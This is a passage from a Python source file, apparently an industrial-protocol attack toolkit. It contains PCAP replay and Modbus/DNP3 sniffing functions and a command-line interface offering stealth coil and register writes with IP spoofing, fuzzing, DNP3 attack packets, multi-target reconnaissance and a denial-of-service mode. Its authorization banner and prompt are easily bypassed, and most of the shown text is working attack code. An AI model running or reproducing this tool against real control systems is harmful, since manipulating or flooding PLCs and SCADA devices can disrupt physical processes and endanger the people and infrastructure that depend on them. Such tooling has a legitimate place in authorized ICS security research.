            sent = 0
            for _ in range(count):
                for p in packets:
                    send(p, verbose=False)
                    sent += 1
                    time.sleep(0.01)
            
            self.logger.info(f"Replayed {sent} packets from {pcap_file}")
            event.success = True
            event.details["packets_sent"] = sent
            self.log_security_event(event)
            return sent
            
        except Exception as e:
            error_msg = f"PCAP replay failed: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)
            return 0

    def passive_sniff(self, iface: str = 'eth0', count: int = 10, pcap_file: Optional[str] = None, timeout: int = 30):
        """Enhanced passive sniffing with protocol detection and timeout"""
        self.logger.info(f"Sniffing industrial protocols on {iface} (timeout: {timeout}s)")
        
        event = SecurityEvent(
            technique=AttackTechnique.RECONNAISSANCE,
            target_ip=self.target_ip,
            port=self.port,
            protocol=ProtocolType.MODBUS_TCP,
            timestamp=time.time(),
            success=False,
            details={"interface": iface, "packet_count": count, "timeout": timeout},
            mitre_technique="T0842",
            mitre_tactic="Network Sniffing"
        )
        
        if self.dry_run:
            self.logger.warning("DRY RUN - No sniffing performed")
            event.details["dry_run"] = True
            event.success = True
            self.log_security_event(event)
            return
        
        def enhanced_protocol_filter(pkt):
            """Enhanced filter for industrial protocol packets with specific detection"""
            if TCP not in pkt and UDP not in pkt:
                return False
            
            # Port-based filtering
            dport = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else None)
            sport = pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else None)
            
            industrial_ports = [502, 102, 20000, 4840, 1911, 2222, 44818, 47808]
            port_match = dport in industrial_ports or sport in industrial_ports
            
            # Protocol-specific detection
            if DNP3 in pkt:
                self.logger.debug("DNP3 packet detected")
                return True
            
            # Modbus detection (check for Modbus TCP header)
            if Raw in pkt and len(pkt[Raw].load) >= 7:
                try:
                    # Modbus TCP has 6-byte MBAP header followed by PDU
                    if pkt[Raw].load[4:6] == b'\x00\x06':  # Typical length for simple requests
                        self.logger.debug("Modbus packet detected")
                        return True
                except:
                    pass
            
            return port_match
        
        try:
            packets = sniff(iface=iface, lfilter=enhanced_protocol_filter, count=count, timeout=timeout)
            
            protocol_stats = {}
            for p in packets:
                if TCP in p:
                    port = p[TCP].dport
                    protocol_name = "TCP"
                elif UDP in p:
                    port = p[UDP].dport  
                    protocol_name = "UDP"
                else:
                    continue
                
                key = f"{protocol_name}:{port}"
                if key in protocol_stats:
                    protocol_stats[key] += 1
                else:
                    protocol_stats[key] = 1
                
                self.logger.info(f"Captured: {p.summary()}")
            
            # Log protocol statistics
            for protocol, count in protocol_stats.items():
                self.logger.info(f"Protocol {protocol}: {count} packets")
            
            if pcap_file:
                wrpcap(pcap_file, packets)
                self.logger.info(f"Saved {len(packets)} packets to {pcap_file}")
            
            event.success = True
            event.details["packets_captured"] = len(packets)
            event.details["protocol_stats"] = protocol_stats
            self.log_security_event(event)
            
        except Exception as e:
            error_msg = f"Sniffing failed: {e}"
            self.logger.error(error_msg)
            event.error = error_msg
            self.log_security_event(event)

    # Placeholder for future protocol support
    async def opcua_recon(self, endpoint: str = None):
        """Placeholder for OPC UA reconnaissance"""
        self.logger.warning("OPC UA support not yet implemented")
        # Future implementation would use: from opcua import Client
        return []
    
    async def enip_recon(self):
        """Placeholder for EtherNet/IP reconnaissance"""
        self.logger.warning("EtherNet/IP support not yet implemented")
        # Future implementation would use: from cpppo.server.enip import client
        return {}

async def main():
    """Enhanced main function with config file support and multi-target capability"""
    # Read configuration file
    config = configparser.ConfigParser()
    config.read('industrial_toolkit.ini')
    
    parser = argparse.ArgumentParser(
        description='Industrial Protocol Security Assessment Toolkit - FOR AUTHORIZED TESTING ONLY',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
EXAMPLES:
  # Basic reconnaissance with interval and loops
  python3 industrial_toolkit.py recon 192.168.1.100 --interval 5 --loops 3
  
  # Read coils
  python3 industrial_toolkit.py read-coils 192.168.1.100 --address 0 --count 10
  
  # Write register with fuzzing
  python3 industrial_toolkit.py write-register 192.168.1.100 --address 0 --value 123 --fuzz
  
  # Multi-target assessment
  python3 industrial_toolkit.py fingerprint 192.168.1.100,192.168.1.101,192.168.1.102
  
  # PCAP replay
  python3 industrial_toolkit.py replay captured_traffic.pcap --count 5
        '''
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Assessment command')
    
    # Common arguments with config file defaults
    common_parser = argparse.ArgumentParser(add_help=False)
    common_parser.add_argument('target', help='Target IP address (comma-separated for multiple)')
    common_parser.add_argument('--port', type=int, 
                              default=config.getint('DEFAULT', 'port', fallback=502),
                              help='Target port (default: 502)')
    common_parser.add_argument('--dry-run', action='store_true', help='Dry run mode (no packets sent)')
    common_parser.add_argument('--json-telemetry', type=str, help='Export events to JSONL file')
    
    # Write command
    write_parser = subparsers.add_parser('write', help='Stealth coil write', parents=[common_parser])
    write_parser.add_argument('coil', type=int, help='Coil address')
    write_parser.add_argument('value', type=bool, help='Value to write (true/false)')
    write_parser.add_argument('--spoof-ip', help='Source IP to spoof')
    write_parser.add_argument('--fuzz', action='store_true', help='Enable fuzzing')
    
    # Write register command
    write_reg_parser = subparsers.add_parser('write-register', help='Stealth register write', parents=[common_parser])
    write_reg_parser.add_argument('--address', type=int, required=True, help='Register address')
    write_reg_parser.add_argument('--value', type=int, required=True, help='Value to write')
    write_reg_parser.add_argument('--input-register', action='store_true', help='Write to input register (if supported)')
    write_reg_parser.add_argument('--fuzz', action='store_true', help='Enable fuzzing')
    
    # Read coils command
    read_coils_parser = subparsers.add_parser('read-coils', help='Read coils', parents=[common_parser])
    read_coils_parser.add_argument('--address', type=int, default=0, help='Start address')
    read_coils_parser.add_argument('--count', type=int, default=1, help='Number of coils')
    
    # Read holding registers command
    read_holding_parser = subparsers.add_parser('read-holding', help='Read holding registers', parents=[common_parser])
    read_holding_parser.add_argument('--address', type=int, default=0, help='Start address')
    read_holding_parser.add_argument('--count', type=int, default=1, help='Number of registers')
    
    # Read input registers command
    read_input_parser = subparsers.add_parser('read-input', help='Read input registers', parents=[common_parser])
    read_input_parser.add_argument('--address', type=int, default=0, help='Start address')
    read_input_parser.add_argument('--count', type=int, default=1, help='Number of registers')
    
    # Recon command with interval and loops
    recon_parser = subparsers.add_parser('recon', help='Comprehensive reconnaissance', parents=[common_parser])
    recon_parser.add_argument('--coil-start', type=int, default=0, help='Start coil')
    recon_parser.add_argument('--coil-end', type=int, default=100, help='End coil')
    recon_parser.add_argument('--register-start', type=int, default=0, help='Start register')
    recon_parser.add_argument('--register-end', type=int, default=100, help='End register')
    recon_parser.add_argument('--interval', type=int, default=0, help='Interval between scans in seconds')
    recon_parser.add_argument('--loops', type=int, default=1, help='Number of scan loops')
    recon_parser.add_argument('--batch-size', type=int, default=10, help='Batch size for efficient scanning')
    recon_parser.add_argument('--save-results', type=str, help='Save results to file (without extension)')
    
    # DNP3 attack command
    dnp3_parser = subparsers.add_parser('dnp3-attack', help='DNP3 protocol attack', parents=[common_parser])
    dnp3_parser.add_argument('--function', type=lambda x: int(x, 0), default=0x01, help='DNP3 function code')
    dnp3_parser.add_argument('--count', type=int, default=1, help='Number of packets')
    dnp3_parser.add_argument('--spoof-ip', help='Source IP to spoof')
    dnp3_parser.add_argument('--transport', choices=['tcp', 'udp'], default='tcp', help='Transport protocol')
    
    # Fingerprint command
    fingerprint_parser = subparsers.add_parser('fingerprint', help='Service fingerprinting', parents=[common_parser])
    
    # DoS command
    dos_parser = subparsers.add_parser('dos', help='DoS simulation (RESEARCH ONLY)', parents=[common_parser])
    dos_parser.add_argument('--coils', required=True, help='Comma-separated coil addresses')
    dos_parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    dos_parser.add_argument('--protocol', choices=['modbus', 'dnp3'], default='modbus', help='Protocol to target')
    
    # Sniff command
    sniff_parser = subparsers.add_parser('sniff', help='Passive protocol sniffing')
    sniff_parser.add_argument('--iface', default='eth0', help='Interface to sniff on')
    sniff_parser.add_argument('--count', type=int, default=10, help='Packets to capture')
    sniff_parser.add_argument('--pcap-file', type=str, help='Save captured packets to PCAP file')
    sniff_parser.add_argument('--timeout', type=int, default=30, help='Sniffing timeout in seconds')
    sniff_parser.add_argument('--dry-run', action='store_true', help='Dry run mode')
    
    # Replay command
    replay_parser = subparsers.add_parser('replay', help='PCAP replay attack')
    replay_parser.add_argument('pcap_file', help='PCAP file to replay')
    replay_parser.add_argument('--count', type=int, default=1, help='Number of times to replay')
    replay_parser.add_argument('--dry-run', action='store_true', help='Dry run mode')
    
    # API mode flag
    parser.add_argument('--api', action='store_true', help='Enable API mode for scriptable use')
    
    args = parser.parse_args()
    
    # API mode check
    if args.api:
        # In API mode, we would return an attacker instance for programmatic use
        print("API mode not fully implemented - use programmatically")
        return
    
    # Authorization and warning
    print("\n" + "="*80)
    print("INDUSTRIAL PROTOCOL SECURITY ASSESSMENT TOOLKIT")
    print("FOR AUTHORIZED SECURITY RESEARCH ONLY")
    print("NATIONAL GOVERNMENT TEST BED LABORATORY USE")
    print("="*80 + "\n")
    
    if not args.command:
        parser.print_help()
        return
    
    # Enhanced authorization check
    confirmation = input("Confirm you have proper authorization and understand the risks (yes/NO): ")
    if confirmation.lower() != 'yes':
        print("Authorization not confirmed - exiting")
        sys.exit(1)
    
    # Handle multi-targets
    targets = args.target.split(',')
    
    for target_ip in targets:
        target_ip = target_ip.strip()
        print(f"\nProcessing target: {target_ip}")
        
        # Initialize attacker for this target
        port = getattr(args, 'port', 502)
        
        if args.command == 'dnp3-attack':
            protocol = ProtocolType.DNP3
            if port == 502:  # Default Modbus port
                port = 20000  # Default DNP3 port
        else:
            protocol = ProtocolType.MODBUS_TCP
        
        try:
            attacker = IndustrialProtocolAttacker(target_ip, port, protocol)
            attacker.dry_run = getattr(args, 'dry_run', False)
            attacker.json_log_file = getattr(args, 'json_telemetry', None)
            
            if args.command == 'write':
                result = await attacker.stealth_coil_write(
                    args.coil, args.value, getattr(args, 'spoof_ip', None), getattr(args, 'fuzz', False)
                )
                print(f"Stealth write {'successful' if result else 'failed'}")
                
            elif args.command == 'write-register':
                result = await attacker.stealth_register_write(
                    args.address, args.value, not args.input_register
                )
                print(f"Register write {'successful' if result else 'failed'}")
                
            elif args.command == 'read-coils':
                coils = await attacker.read_coils(args.address, args.count)
                print(f"Read {len(coils)} coils: {coils}")
                
            elif args.command == 'read-holding':
                registers = await attacker.read_holding_registers(args.address, args.count)
                print(f"Read {len(registers)} holding registers: {registers}")
                
            elif args.command == 'read-input':
                registers = await attacker.read_input_registers(args.address, args.count)
                print(f"Read {len(registers)} input registers: {registers}")
                
            elif args.command == 'recon':
                coils, holding_regs, input_regs = await attacker.reconnaissance_scan(
                    args.coil_start, args.coil_end, 
                    args.register_start, args.register_end, 
                    args.interval, args.loops, args.batch_size
                )
                print(f"Reconnaissance complete for {target_ip}:")
                print(f"  - Accessible coils: {len(coils)}")
                print(f"  - Accessible holding registers: {len(holding_regs)}") 
                print(f"  - Accessible input registers: {len(input_regs)}")
                
                if hasattr(args, 'save_results') and args.save_results:
                    filename = f"{args.save_results}_{target_ip.replace('.', '_')}"
                    attacker.save_recon_results(coils, holding_regs, input_regs, filename)
                
            elif args.command == 'dnp3-attack':
                result = attacker.dnp3_attack(
                    args.function, 
                    count=args.count,
                    spoof_ip=getattr(args, 'spoof_ip', None),
                    transport=args.transport
                )
                print(f"Sent {result} DNP3 attack packets")
                
            elif args.command == 'fingerprint':
                services = attacker.fingerprint_services()
                print(f"Discovered {len(services)} services on {target_ip}:")
                for port, info in services.items():
                    vuln_info = ""
                    if "known_vulnerabilities" in info:
                        vuln_info = f" - CVEs: {', '.join(info['known_vulnerabilities'][:2])}"
                    print(f"  - Port {port}: {info['service']} - {info['banner'][:50]}...{vuln_info}")
                    
            elif args.command == 'dos':
                coils = [int(c.strip()) for c in args.coils.split(',')]
                protocol = ProtocolType.DNP3 if args.protocol == 'dnp3' else ProtocolType.MODBUS_TCP
                result = attacker.denial_of_service_attack(coils, args.duration, protocol)
                print(f"Sent {result} packets in DoS simulation")
                
            elif args.command == 'sniff':
                attacker.passive_sniff(args.iface, args.count, args.pcap_file, args.timeout)
                print("Sniffing complete")
                
            elif args.command == 'replay':
                result = attacker.replay_pcap(args.pcap_file, args.count)
                print(f"Replayed {result} packets")
                
        except KeyboardInterrupt:
            print(f"\nAssessment interrupted by user for target {target_ip}")
            continue
        except ModbusException as e:
            print(f"Modbus error for target {target_ip}: {e}")
            continue
        except socket.error as e:
            print(f"Network error for target {target_ip}: {e}")
            continue
        except Exception as e:
            print(f"Assessment failed for target {target_ip}: {e}")
            continue

if __name__ == "__main__":
    # Check if running in API mode
    if len(sys.argv) > 1 and sys.argv[1] == '--api':
        print("API mode - import and use IndustrialProtocolAttacker class programmatically")
    else:
        asyncio.run(main())
